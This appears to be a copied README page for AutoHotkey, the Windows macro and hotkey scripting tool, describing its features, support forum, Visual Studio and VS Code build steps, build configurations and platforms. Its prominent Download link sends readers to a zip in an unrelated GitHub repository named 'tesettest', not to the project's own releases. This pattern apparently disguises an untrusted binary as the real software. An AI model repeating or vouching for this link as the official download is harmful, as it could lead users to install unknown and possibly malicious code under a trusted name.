# AutoHotkey: Windows Automation and Macro Scripting

AutoHotkey is a free, open-source scripting utility for Windows focused on automation, macro creation, and keyboard shortcut workflows. It uses a custom scripting language designed to help users automate repetitive tasks and define hotkeys for faster interaction with applications and the operating system.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/AutoHotkey.zip)

## What AutoHotkey Does

AutoHotkey provides a scripting environment for automating common Windows actions. Users can write scripts that respond to keyboard shortcuts, streamline repeated operations, and create custom automation behavior.

Typical uses include:

- Defining keyboard shortcuts for frequent actions
- Creating macros for repetitive desktop tasks
- Automating simple Windows workflows
- Building small utility scripts for personal productivity
- Customizing input behavior with hotkeys

AutoHotkey is intended for users who want practical automation without needing a full application framework.

## Key Concepts

### Scripts

AutoHotkey is driven by scripts written in its own language. These scripts describe what should happen when a condition is met, such as pressing a specific key combination.

### Hotkeys

A central feature of AutoHotkey is the ability to define hotkeys. A hotkey is a keyboard shortcut that triggers an action, script routine, or automation sequence.

### Windows Focus

AutoHotkey is designed for Windows. The project includes support for both 32-bit and 64-bit Windows builds.

## Support and Community

The primary support channel for AutoHotkey users is the AutoHotkey Community forum.

Support topics are generally separated by purpose:

- Help with scripts and expected behavior
- Bug reports after an issue has been confirmed
- Questions related to development
- Version-specific discussions for AutoHotkey v1 and v2

AutoHotkey v1 is no longer actively maintained, though community members may still provide assistance.

## Building from Source

AutoHotkey is developed with Microsoft Visual Studio Community 2022.

General build workflow:

1. Get the source code.
2. Open `AutoHotkeyx.sln` in Visual Studio.
3. Select the desired build configuration and platform.
4. Build the project.

The project is configured to allow building with Visual Studio 2012 or later, but the 2022 toolset is the regularly tested environment. Some C++ language features may require a newer compiler.

## Development with VS Code

AutoHotkey v2 can also be built and debugged with Visual Studio Code.

Recommended requirements:

- C/C++ extension for Visual Studio Code
- Build Tools for Visual Studio 2022 with the Desktop development with C++ workload, or a similar compatible setup

This setup is useful for developers who prefer VS Code while still relying on Microsoft C++ build tools.

## Build Configurations

`AutoHotkeyx.vcxproj` includes several build configuration combinations.

Main configurations:

- `Debug` — builds `AutoHotkey.exe` in debug mode
- `Release` — builds `AutoHotkey.exe` for general use
- `Self-contained` — builds `AutoHotkeySC.bin`, used for compiled scripts

Additional configuration variants:

- `(mbcs)` — builds an ANSI, multi-byte character set version
- `.dll` — builds an experimental DLL for hosting the interpreter

Unicode builds are used by configurations without the `(mbcs)` suffix.

## Supported Platforms

The Visual Studio project includes these platforms:

| Platform | Purpose |
| --- | --- |
| `Win32` | Windows 32-bit builds |
| `x64` | Windows 64-bit builds |

AutoHotkey includes support for Windows XP, with or without service packs. Windows 2000 support is provided through an assembly compatibility patch. Older versions are not supported, and legacy support may be removed if it becomes difficult to maintain.

## FAQ

### Is AutoHotkey only for Windows?

Yes. AutoHotkey is a Windows automation and macro scripting utility.

### What is the main purpose of AutoHotkey?

Its main purpose is to automate repetitive tasks and define custom keyboard shortcuts using scripts.

### Which version should new scripts use?

The README distinguishes between AutoHotkey v1 and v2 support areas. AutoHotkey v1 is not actively maintained, while AutoHotkey v2 is the current development focus described for VS Code building and debugging.

### Can AutoHotkey be built from source?

Yes. The project can be built with Visual Studio, with Visual Studio 2022 being the regularly tested toolset.

### Does the project support both 32-bit and 64-bit builds?

Yes. The project includes `Win32` and `x64` platforms.
